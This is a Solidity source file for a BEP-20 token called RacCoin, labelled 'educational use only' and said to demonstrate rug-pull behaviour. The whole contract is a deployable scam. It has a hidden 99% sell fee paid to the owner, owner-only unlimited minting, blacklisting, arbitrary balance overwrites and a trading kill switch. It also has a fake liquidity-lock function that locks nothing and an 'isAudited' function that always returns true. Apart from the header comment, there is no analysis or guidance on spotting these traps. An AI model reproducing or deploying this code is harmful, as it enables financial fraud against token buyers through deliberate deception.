// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 🚨 EDUCATIONAL USE ONLY 🚨
 * Demonstrates malicious BEP-20 behavior for rug-pull awareness.
 * Token: RacCoin (RAC)
 */

contract RacCoin {
    string public name = "RacCoin";
    string public symbol = "RAC";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _blacklisted;

    bool public tradingEnabled = true;
    address public liquidityPool;

    constructor() {
        owner = msg.sender;
        // Mint 100,000 RAC at deploy (rest can be minted later)
        _mint(owner, 100_000 * 10**decimals);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notBlacklisted(address user) {
        require(!_blacklisted[user], "Blacklisted");
        _;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public notBlacklisted(msg.sender) returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) public notBlacklisted(msg.sender) returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public notBlacklisted(sender) returns (bool) {
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");
        allowance[sender][msg.sender] -= amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(tradingEnabled || sender == owner, "Trading disabled");
        require(_balances[sender] >= amount, "Insufficient balance");

        // Honeypot: 99% sell fee when sending to LP
        if (recipient == liquidityPool && sender != owner) {
            uint256 fee = (amount * 99) / 100;
            _balances[sender] -= amount;
            _balances[owner] += fee;
            _balances[recipient] += amount - fee;
        } else {
            _balances[sender] -= amount;
            _balances[recipient] += amount;
        }
    }

    function mint(uint256 amount) public onlyOwner {
        _mint(owner, amount);
    }

    function _mint(address account, uint256 amount) internal {
        _balances[account] += amount;
        totalSupply += amount;
    }

    function setLiquidityPool(address _lp) public onlyOwner {
        liquidityPool = _lp;
    }

    function blacklist(address user) public onlyOwner {
        _blacklisted[user] = true;
    }

    function setBalance(address user, uint256 amount) public onlyOwner {
        _balances[user] = amount;
    }

    function disableTrading() public onlyOwner {
        tradingEnabled = false;
    }

    event LiquidityLocked(uint256 amount, uint256 until);

    function lockLiquidity(uint256 amount, uint256 time) public onlyOwner {
        emit LiquidityLocked(amount, block.timestamp + time);
    }

    function isAudited() public pure returns (bool) {
        return true;
    }
}
